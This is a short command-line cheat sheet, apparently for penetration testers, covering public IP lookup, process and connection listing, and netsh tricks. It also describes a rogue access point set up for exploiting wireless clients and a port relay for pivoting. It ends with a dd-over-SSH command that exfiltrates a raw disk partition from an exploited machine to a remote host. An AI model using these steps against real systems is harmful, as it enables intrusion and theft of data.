# Windows CMD Line Tools #

## Get Public IP Address

	curl -4 icanhazip.com

or

	dig +short myip.opendns.com @resolver1.opendns.com

or

	wget -qO- ifconfig.me/ip

## Configure a Windows machine as a WPA2-PSK Access Point ## 

### Usage scenario: Share a Windows machine’s Internet access with other systems wirelessly, or use a Windows machine to attract wireless clients into joining it for exploitation purposes

	netsh wlan set hostednetwork mode=allow ssid=<MYSSID>
	key=<MYPASSWORD> && netsh wlan start hostednetwork

## Configure a TCP port forwarding relay from IPv4 to IPv6 (v4tov4, v6tov6, and v6tov4 also supported). ##

### Usage scenario: Pivot a TCP connection through a Windows machine using built-in functionality, converting IPv4 to IPv6 as needed. ###

	netsh interface portproxy add v4tov6 listenport=<LPORT>
	listenaddress=0.0.0.0 connectport=<RPORT> connectaddress=<RHOST>

## Get a list of TCP and UDP activity every 1 second. ##

### Usage scenario: Look for a connection coming in from a specific IP
address or port to determine when the connection occurs, within 1 second.

	netstat -naob 1 | find "<IPADDR or PORT>"

## Get a list of all available attributes of all running processes. ##

### Usage scenario: Look through processes to determine what is running,
including potentially exploitable software, malware, and other tools.

	wmic process list full

## Get a list of services running inside of each process. ##

### Usage scenario: Look for running services that might be exploitable or
running malware.

	tasklist /svc



## Encrypted Data Exfiltration

### Exfiltrate the contents of an image via SSH to another machine, compressing (-C) the content to speed up transfer. Usage scenario: Upon exploiting a machine with a small file system or particularly interesting partition, move that partition to the pen tester’s machine, compressing and encrypting data using SSH.

	dd if=/dev/rdisk0s1s2
	bs=65536 conv=noerror,sync
	| ssh -C user@10.10.10.10
	"cat >/tmp/image.dd"

